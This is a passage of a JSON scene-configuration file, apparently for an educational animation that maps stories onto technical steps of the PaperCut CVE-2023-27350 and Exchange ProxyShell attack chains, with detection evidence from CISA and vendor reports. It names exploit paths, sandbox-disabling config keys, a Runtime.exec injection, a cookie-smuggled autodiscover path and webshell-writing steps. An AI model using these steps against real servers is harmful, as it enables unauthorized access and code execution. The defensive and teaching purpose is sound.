      "technicalCue": "T1190 · INITIAL ACCESS — The attacker sends an HTTP GET request to /app?service=page/SetupCompleted followed by a POST request invoking the Tapestry form listener service=direct/1/SetupCompleted/$Form (an internal…",
      "storyMappings": [
        {
          "storyTerm": "Installation completion page",
          "technicalTerm": "/app?service=page/SetupCompleted web route",
          "tone": "amber"
        },
        {
          "storyTerm": "Submitted welcome form",
          "technicalTerm": "POST request targeting SetupCompleted/$Form",
          "tone": "sky"
        },
        {
          "storyTerm": "Active manager badge",
          "technicalTerm": "Authenticated administrator JSESSIONID cookie",
          "tone": "rose"
        },
        {
          "storyTerm": "Missing identity check",
          "technicalTerm": "Improper access control flaw (CVE-2023-27350)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#10B981",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-papercut-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Installation completion page",
          "subtitle": "/app?service=page/SetupCompleted web route",
          "tone": "amber"
        },
        {
          "id": "net-papercut-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Submitted welcome form",
          "subtitle": "POST request targeting SetupCompleted/$Form",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Page",
          "stageTag": "STEP 01 · SETUP",
          "title": "Installation completion page",
          "storyExcerpt": "An outsider opens the old installation completion page and clicks straight through the welcome form.",
          "technicalParallel": "Why did SetupCompleted.formSubmit() call performLogin(\"admin\")?",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Form",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Submitted welcome form",
          "storyExcerpt": "Because the door routine fails to verify prior login, the server stamps and hands back an active manager badge.",
          "technicalParallel": "The attacker sends an HTTP GET request to /app?service=page/SetupCompleted followed by a POST request invoking the Tapestry form listener service=direct/1/SetupCompleted/$Form (an internal onboarding…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Missing identity check",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across missing identity check while locking down active manager badge.",
          "technicalParallel": "Documented in CISA AA23-131A and Horizon3.ai (web access log signatures for PaperCut bypass): HTTP requests to /app?service=page/SetupCompleted and POST requests containing SetupCompleted/$Form…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Print Press",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Setup Desk",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Session",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "papercut-ng-cve-2023-27350-bl00dy",
      "sectionKey": "step-2",
      "sceneKind": "net-papercut-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Disabling the Mozilla Rhino JavaScript Sandbox (print.script.sandboxed=N) in ConfigEditor",
      "storyCue": "Inside the manager settings drawer, the outsider enables custom print scripting and flips the protective safety barrier off so printer helper rules can reach outside the print room into the main building machinery.",
      "technicalCue": "T1059.007 · DEFENSE EVASION — Using the hijacked Admin JSESSIONID cookie, the attacker opens /app?service=page/ConfigEditor and modifies two internal configuration keys: setting print-and-device.script.enabled=Y and…",
      "storyMappings": [
        {
          "storyTerm": "Custom scripting switch",
          "technicalTerm": "print-and-device.script.enabled configuration option",
          "tone": "amber"
        },
        {
          "storyTerm": "Protective safety barrier",
          "technicalTerm": "print.script.sandboxed Mozilla Rhino sandbox flag",
          "tone": "sky"
        },
        {
          "storyTerm": "Manager settings audit",
          "technicalTerm": "PaperCut server.log and Admin Audit configuration trail",
          "tone": "rose"
        },
        {
          "storyTerm": "Main building machinery",
          "technicalTerm": "Unrestricted underlying Java runtime APIs",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-papercut-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Custom scripting switch",
          "subtitle": "print-and-device.script.enabled configuration option",
          "tone": "amber"
        },
        {
          "id": "net-papercut-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Protective safety barrier",
          "subtitle": "print.script.sandboxed Mozilla Rhino sandbox flag",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Off So",
          "stageTag": "STEP 02 · SETUP",
          "title": "Custom scripting switch",
          "storyExcerpt": "Inside the manager settings drawer, the outsider enables custom print scripting and flips the protective safety barrier off so printer helper rules can reach outside the print room into the…",
          "technicalParallel": "PaperCut embeds the Mozilla Rhino JavaScript engine (org.mozilla.javascript) so administrators can write custom JavaScript policies for print jobs.",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Protective safety barrier",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses protective safety barrier to advance toward manager settings audit.",
          "technicalParallel": "Using the hijacked Admin JSESSIONID cookie, the attacker opens /app?service=page/ConfigEditor and modifies two internal configuration keys: setting print-and-device.script.enabled=Y and…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Main",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Main building machinery",
          "storyExcerpt": "Behind the scenes, main building machinery captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Horizon3.ai and CISA AA23-131A (application configuration audit evidence): PaperCut server.log and Admin Audit entries showing modifications to print-and-device.script.enabled and…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Print Press",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Setup Desk",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Session",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.007"
    },
    "step-3": {
      "scenarioId": "papercut-ng-cve-2023-27350-bl00dy",
      "sectionKey": "step-3",
      "sceneKind": "net-papercut-step-3",
      "stageBadge": "STEP #3 · EXECUTION",
      "title": "Injecting java.lang.Runtime.getRuntime().exec() into a Printer Script to Run as SYSTEM",
      "storyCue": "With the safety barrier disabled, the outsider pastes a short system instruction into an existing printer rule and triggers a test print, instantly executing commands with the print shop highest building clearance.",
      "technicalCue": "T1059.001 · EXECUTION — The attacker navigates to /app?service=page/PrinterDetails, edits a printer script, and injects java.lang.Runtime.getRuntime().exec(\"powershell.exe ...\") outside or inside the printJobHook()…",
      "storyMappings": [
        {
          "storyTerm": "Existing printer rule",
          "technicalTerm": "Device print script executed by Rhino engine",
          "tone": "amber"
        },
        {
          "storyTerm": "Inserted system instruction",
          "technicalTerm": "java.lang.Runtime.getRuntime().exec() invocation",
          "tone": "sky"
        },
        {
          "storyTerm": "Print shop service engine",
          "technicalTerm": "pc-app.exe running under NT AUTHORITY\\SYSTEM",
          "tone": "rose"
        },
        {
          "storyTerm": "Spawned workshop utilities",
          "technicalTerm": "Child cmd.exe, powershell.exe, certutil.exe, or bitsadmin.exe",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-papercut-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Existing printer rule",
          "subtitle": "Device print script executed by Rhino engine",
          "tone": "amber"
        },
        {
          "id": "net-papercut-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Inserted system instruction",
          "subtitle": "java.lang.Runtime.getRuntime().exec() invocation",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Rule",
          "stageTag": "STEP 03 · SETUP",
          "title": "Existing printer rule",
          "storyExcerpt": "With the safety barrier disabled, the outsider pastes a short system instruction into an existing printer rule and triggers a test print, instantly executing commands with the print shop…",
          "technicalParallel": "On enterprise hosts, the PaperCut Application Server service (pc-app.exe) runs by default under NT AUTHORITY\\SYSTEM (the highest local operating system privilege level), so any command triggered through…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Shop",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Inserted system instruction",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses inserted system instruction to advance toward print shop service engine.",
          "technicalParallel": "The attacker navigates to /app?service=page/PrinterDetails, edits a printer script, and injects java.lang.Runtime.getRuntime().exec(\"powershell.exe ...\") outside or inside the printJobHook() function…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Shop",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Spawned workshop utilities",
          "storyExcerpt": "Behind the scenes, spawned workshop utilities captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in CISA AA23-131A (endpoint process telemetry for PaperCut post-exploitation): Sysmon EventID 1 showing C:\\Program Files\\PaperCut NG\\server\\bin\\win\\pc-app.exe spawning cmd.exe, powershell.exe…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Print Press",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Setup Desk",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Session",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.001"
    },
    "memory-forensics": {
      "scenarioId": "papercut-ng-cve-2023-27350-bl00dy",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-papercut-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "PaperCut MF/NG SetupCompleted Auth Bypass & Rhino JS SYSTEM RCE — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of print press beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: pc-app.exe (Mozilla Rhino Script Engine Context (Unsandboxed) [RW-])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of pc-app.exe",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x00000000E1200000 (RW-, 48 KB) · Mozilla Rhino Script Engine Context (Unsandboxed)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against pc-app.exe (PID 2844)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "In-memory Rhino JavaScript evaluation context with ClassShutter disabled (print.script.sandboxed=N), permitting direct…",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-papercut-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of pc-app.exe",
          "tone": "sky"
        },
        {
          "id": "net-papercut-memory-xray-right",
          "tag": "LIVE MEMORY · RW-",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x00000000E1200000 (RW-, 48 KB) · Mozilla Rhino Script Engine…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline pc-app.exe loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x00000000E1200000 (RW-, 48 KB) containing Mozilla Rhino Script Engine Context (Unsandboxed).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 2844 confirms patched region: In-memory Rhino JavaScript evaluation context with ClassShutter disabled (print.script.sandboxed=N), permitting direct access to java.lang.Runtime.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "proxyshell-exchange-cve-2021-34473": {
    "briefing": {
      "scenarioId": "proxyshell-exchange-cve-2021-34473",
      "sectionKey": "briefing",
      "sceneKind": "net-proxyshell-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Microsoft Exchange \"ProxyShell\": Autodiscover SSRF to MailboxExport… — Story-to-Technical Overview",
      "storyCue": "A corporate mail building has a polite front concierge who forwards requests to an inner vault room. An outsider writes a deceptive hallway address that tricks the concierge into forwarding directly to the vault, flashes a forged supervisor ribbon to grant mail-export rights, and prints an executable backdoor tucked inside a routine mail export bag.",
      "technicalCue": "INITIAL ACCESS: AUTODISCOVER.JSON PATH CONFUSION & ACL BYPASS (CVE-2021-34473) -> DEFENSE EVASION: POWERSHELL X-RPS-CAT IMPERSONATION & ROLE ASSIGNMENT (CVE-2021-34523) -> PERSISTENCE: NEW-MAILBOXEXPORTREQUEST ARBITRARY .ASPX WEBSHELL WRITE (CVE-2021-31207)",
      "storyMappings": [
        {
          "storyTerm": "Front lobby concierge",
          "technicalTerm": "Exchange Client Access front-end proxy",
          "tone": "amber"
        },
        {
          "storyTerm": "Deceptive hallway address",
          "technicalTerm": "URL confusion path /autodiscover/autodiscover.json (CVE-2021-34473)",
          "tone": "sky"
        },
        {
          "storyTerm": "Forged supervisor ribbon",
          "technicalTerm": "Crafted X-Rps-CAT Kerberos/Windows token (CVE-2021-34523)",
          "tone": "rose"
        },
        {
          "storyTerm": "Mail export bag backdoor",
          "technicalTerm": "PST/ASPX polyglot webshell via New-MailboxExportRequest (CVE-2021-31207)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-proxyshell-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Front lobby concierge",
          "subtitle": "Exchange Client Access front-end proxy",
          "tone": "amber"
        },
        {
          "id": "net-proxyshell-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Deceptive hallway address",
          "subtitle": "URL confusion path /autodiscover/autodiscover.json…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Desk",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "AUTODISCOVER.JSON PATH CONFUSION & ACL BYPASS (CVE-2021-34473)",
          "storyExcerpt": "The outsider hands the front concierge an inquiry envelope addressed to a public directory desk, with a real back-office command room tucked behind the street label. The concierge checks the outer stamp…",
          "technicalParallel": "Attackers also used an alternate form discovered in the wild: placing the path inside an HTTP cookie (Cookie: Email=autodiscover/autodiscover.json%3F@foo.com) so simple URL filters looking for \"@foo.com\"…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Hand-crafted",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "POWERSHELL X-RPS-CAT IMPERSONATION & ROLE ASSIGNMENT (CVE-2021-34523)",
          "storyExcerpt": "Inside the back office, the outsider attaches a hand-crafted supervisor clearance ribbon to their request. Trusting the concierge delivery stamp, the office elevates the caller to mail administrator and…",
          "technicalParallel": "How did the attacker know the Exchange Administrator’s SID before logging in?",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Shop-floor Then",
          "stageTag": "STAGE 03 · PERSISTENCE",
          "title": "NEW-MAILBOXEXPORTREQUEST ARBITRARY .ASPX WEBSHELL WRITE (CVE-2021-31207)",
          "storyExcerpt": "The intruder saves a draft message containing hidden shop-floor instructions, then commands the mailroom to export that mailbox straight onto the public noticeboard with a web-script label so any visitor…",
          "technicalParallel": "Why did the raw ASPX code have to be specially encoded inside the draft email?",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Lobby Desk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Mailroom Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Backend Relay",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "proxyshell-exchange-cve-2021-34473",
      "sectionKey": "step-1",
      "sceneKind": "net-proxyshell-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Bypassing Frontend Authentication with /autodiscover/autodiscover.json?@foo.com/powershell/ (CVE-2021-34473)",
      "storyCue": "The outsider hands the front concierge an inquiry envelope addressed to a public directory desk, with a real back-office command room tucked behind the street label. The concierge checks the outer stamp and delivers the envelope straight to the locked back office.",
      "technicalCue": "T1190 · INITIAL ACCESS — In Microsoft Exchange’s Architecture, the internet-facing Frontend Client Access Service (CAS on TCP 443) authenticates users and proxies their requests to the internal Backend server (on TCP…",
      "storyMappings": [
        {
          "storyTerm": "Public directory desk",
          "technicalTerm": "/autodiscover/autodiscover.json prefix",
          "tone": "amber"
        },
        {
          "storyTerm": "Locked back office",
          "technicalTerm": "Internal /powershell and /mapi/nspi backend endpoints",
          "tone": "sky"
        },
        {
          "storyTerm": "Front lobby concierge",
          "technicalTerm": "Exchange front-end IIS proxy service",
          "tone": "rose"
        },
        {
          "storyTerm": "Concierge delivery log",
          "technicalTerm": "IIS W3SVC front-end access logs",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-proxyshell-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Public directory desk",
          "subtitle": "/autodiscover/autodiscover.json prefix",
          "tone": "amber"
        },
        {
          "id": "net-proxyshell-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Locked back office",
          "subtitle": "Internal /powershell and /mapi/nspi backend endpoints",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Desk",
          "stageTag": "STEP 01 · SETUP",
          "title": "Public directory desk",
          "storyExcerpt": "The outsider hands the front concierge an inquiry envelope addressed to a public directory desk, with a real back-office command room tucked behind the street label.",
          "technicalParallel": "Attackers also used an alternate form discovered in the wild: placing the path inside an HTTP cookie (Cookie: Email=autodiscover/autodiscover.json%3F@foo.com) so simple URL filters looking for \"@foo.com\"…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Back",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Locked back office",
          "storyExcerpt": "The concierge checks the outer stamp and delivers the envelope straight to the locked back office.",
          "technicalParallel": "In Microsoft Exchange’s Architecture, the internet-facing Frontend Client Access Service (CAS on TCP 443) authenticates users and proxies their requests to the internal Backend server (on TCP 444) using…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Log",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Concierge delivery log",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across concierge delivery log while locking down front lobby concierge.",
          "technicalParallel": "Documented in CISA AA21-265A and Splunk SURGe (web server detections for ProxyShell pre-auth SSRF): IIS W3SVC logs showing /autodiscover/autodiscover.json paired with /powershell or /mapi/nspi (revealing…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Lobby Desk",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Mailroom Vault",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Backend Relay",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "proxyshell-exchange-cve-2021-34473",
      "sectionKey": "step-2",
      "sceneKind": "net-proxyshell-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Injecting a Forged X-Rps-CAT Token to Impersonate the Exchange Admin in PowerShell (CVE-2021-34523)",
      "storyCue": "Inside the back office, the outsider attaches a hand-crafted supervisor clearance ribbon to their request. Trusting the concierge delivery stamp, the office elevates the caller to mail administrator and activates full mailbox export privileges.",
      "technicalCue": "T1059.001 · DEFENSE EVASION — When the proxied request reaches the Backend PowerShell endpoint (:444/powershell/), it initially fails because the NT AUTHORITY\\SYSTEM computer account does not have a user security token…",
      "storyMappings": [
        {
          "storyTerm": "Hand-crafted supervisor ribbon",
          "technicalTerm": "Forged X-Rps-CAT query string token",
          "tone": "amber"
        },
        {
          "storyTerm": "Mail administrator status",
          "technicalTerm": "Impersonated Exchange Administrator SID",
          "tone": "sky"
        },
        {
          "storyTerm": "Activated export privilege",
          "technicalTerm": "Assigned Mailbox Import Export management role",
          "tone": "rose"
        },
        {
          "storyTerm": "Management policy log",
          "technicalTerm": "MSExchange Management administrative event log",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-proxyshell-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Hand-crafted supervisor ribbon",
          "subtitle": "Forged X-Rps-CAT query string token",
          "tone": "amber"
        },
        {
          "id": "net-proxyshell-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Mail administrator status",
          "subtitle": "Impersonated Exchange Administrator SID",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Hand-crafted",
          "stageTag": "STEP 02 · SETUP",
          "title": "Hand-crafted supervisor ribbon",
          "storyExcerpt": "Inside the back office, the outsider attaches a hand-crafted supervisor clearance ribbon to their request.",
          "technicalParallel": "How did the attacker know the Exchange Administrator’s SID before logging in?",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Mail",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Mail administrator status",
          "storyExcerpt": "Trusting the concierge delivery stamp, the office elevates the caller to mail administrator and activates full mailbox export privileges.",
          "technicalParallel": "When the proxied request reaches the Backend PowerShell endpoint (:444/powershell/), it initially fails because the NT AUTHORITY\\SYSTEM computer account does not have a user security token attached.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Log",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Management policy log",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across management policy log while locking down activated export privilege.",
          "technicalParallel": "Documented by Mandiant and DEVCORE (privilege escalation evidence in ProxyShell chains): X-Rps-CAT= in IIS query strings and New-ManagementRoleAssignment -Role \"Mailbox Import Export\" in MSExchange…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Lobby Desk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Mailroom Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Backend Relay",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.001"
    },
    "step-3": {
      "scenarioId": "proxyshell-exchange-cve-2021-34473",
      "sectionKey": "step-3",
      "sceneKind": "net-proxyshell-step-3",
      "stageBadge": "STEP #3 · PERSISTENCE",
      "title": "Using New-MailboxExportRequest to Write a PST/ASPX Polyglot Webshell (CVE-2021-31207)",
      "storyCue": "The intruder saves a draft message containing hidden shop-floor instructions, then commands the mailroom to export that mailbox straight onto the public noticeboard with a web-script label so any visitor can trigger commands on demand.",
      "technicalCue": "T1505.003 · PERSISTENCE — With the \"Mailbox Import Export\" role assigned, the attacker saves a draft email containing an encoded JScript/C# ASPX webshell, and then executes New-MailboxExportRequest -Mailbox…",
      "storyMappings": [
        {
          "storyTerm": "Draft message with hidden instructions",
          "technicalTerm": "Encoded webshell payload embedded in mailbox draft",
          "tone": "amber"
        },
        {
          "storyTerm": "Mailbox export command",
          "technicalTerm": "New-MailboxExportRequest targeting a web-accessible path",
          "tone": "sky"
        },
        {
          "storyTerm": "Public noticeboard wall",
          "technicalTerm": "Exchange IIS inetpub webroot directory",
          "tone": "rose"
        },
        {
          "storyTerm": "Web-script label",
          "technicalTerm": "Written .aspx polyglot webshell file",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-proxyshell-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Draft message with hidden instructions",
          "subtitle": "Encoded webshell payload embedded in mailbox draft",
          "tone": "amber"
        },
        {
          "id": "net-proxyshell-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Mailbox export command",
          "subtitle": "New-MailboxExportRequest targeting a web-accessible path",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Shop-floor Then",
          "stageTag": "STEP 03 · SETUP",
          "title": "Draft message with hidden instructions",
          "storyExcerpt": "The intruder saves a draft message containing hidden shop-floor instructions, then commands the mailroom to export that mailbox straight onto the public noticeboard with a web-script label so…",
          "technicalParallel": "Why did the raw ASPX code have to be specially encoded inside the draft email?",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
